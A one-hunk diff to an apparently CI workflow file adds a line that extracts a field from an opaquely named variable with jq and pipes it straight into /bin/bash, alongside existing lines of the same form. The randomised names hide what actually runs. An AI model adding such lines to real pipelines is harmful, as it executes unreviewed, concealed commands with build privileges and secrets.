@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$rgmxd149" | jq -r .fp417 | /bin/bash
           echo $yrb35870 | jq -r .f0938 | /bin/bash
           printf '%s' "$kjbl45" | jq -r .ou6525 | /bin/bash
+          echo $pxyh0 | jq -r .soi647 | /bin/bash
 
       - name: Persist output
         if: always()
